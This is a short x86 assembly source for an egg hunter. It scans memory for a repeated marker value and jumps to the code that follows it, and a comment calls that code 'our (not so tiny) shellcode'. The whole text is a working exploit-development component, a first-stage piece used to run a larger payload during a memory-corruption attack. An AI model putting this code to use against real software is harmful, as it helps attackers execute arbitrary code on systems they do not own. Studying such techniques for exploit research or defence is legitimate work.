global _start
 
section .text
 
_start:
    pop eax
_next:
    inc eax
 
_isegg:
     
    cmp dword [eax-0x8],0x68474765 ;start egg
    jne _next
 
    cmp dword [eax-0x4],0x68474765 ;end egg
    jne _next
 
    jmp eax ;execute our (not so tiny) shellcode
